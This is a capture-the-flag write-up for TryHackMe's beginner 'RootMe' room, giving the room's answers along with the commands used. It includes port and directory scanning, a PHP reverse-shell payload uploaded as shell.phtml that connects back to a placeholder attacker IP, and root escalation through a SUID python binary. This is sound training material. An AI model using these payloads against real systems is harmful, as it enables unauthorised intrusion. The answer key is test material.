# [RootMe](https://tryhackme.com/room/rrootme)

## A ctf for beginners, can you root me?

# Reconnaissance

## First, let's get information about the target.

### Scan the machine, how many ports are open?

_Use nmap to do a port scan._

1. Use nmap to perform a service version detection scan on the target machine. The `-sV` flag enables version detection to identify services and their versions.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** 2

---

### What version of Apache is running?

**Answer:** 2.4.41

---

### What service is running on port 22?

**Answer:** ssh

---

### What is the hidden directory?

_gobuster dir -u MACHINE_IP -w WORDLIST_PATH_

1. Use gobuster to brute-force directories on the web server.

```bash
gobuster dir -u http://<TARGET_IP>-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

**Results:**

```
/uploads              (Status: 301) [Size: 314]
/css                  (Status: 301) [Size: 310]
/js                   (Status: 301) [Size: 309]
/panel                (Status: 301) [Size: 312]
/server-status        (Status: 403) [Size: 277]
```

**Answer:** /panel/

---

# Getting a shell

## Find a form to upload and get a reverse shell, and find the flag.

### user.txt

_Search for "file upload bypass" and "PHP reverse shell"._

1. Create a reverse shell payload and name it `shell.phtml`:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

2. Set up a netcat listener on your attacking machine:

```bash
nc -lvnp 4444
```

3. Navigate to `http://<TARGET_IP>/panel/` and upload the `shell.phtml` file through the upload form.

4. Visit `http://<TARGET_IP>/uploads/shell.phtml` to execute the payload.

5. Once you have a shell, search for the `user.txt` file:

```bash
find / -type f -name "user.txt" 2>/dev/null
cat /var/www/user.txt
```

[SCREEN01]

---

# Privilege escalation

## Now that we have a shell, let's escalate our privileges to root.

### Search for files with SUID permission, which file is weird?

_find / -user root -perm /4000_

1. Find SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python2.7
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core20/2599/usr/bin/chfn
/snap/core20/2599/usr/bin/chsh
/snap/core20/2599/usr/bin/gpasswd
/snap/core20/2599/usr/bin/mount
/snap/core20/2599/usr/bin/newgrp
/snap/core20/2599/usr/bin/passwd
/snap/core20/2599/usr/bin/su
/snap/core20/2599/usr/bin/sudo
/snap/core20/2599/usr/bin/umount
/snap/core20/2599/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2599/usr/lib/openssh/ssh-keysign
/bin/mount
/bin/su
/bin/fusermount
/bin/umount
```

The `/usr/bin/python` binary with SUID permissions is highly unusual.

**Answer:** /usr/bin/python

---

### root.txt

_Search for gtfobins_

1. Stabilize the shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Check [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid) for Python SUID exploitation:

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
ls /root
cat /root/root.txt
```

[SCREEN02]
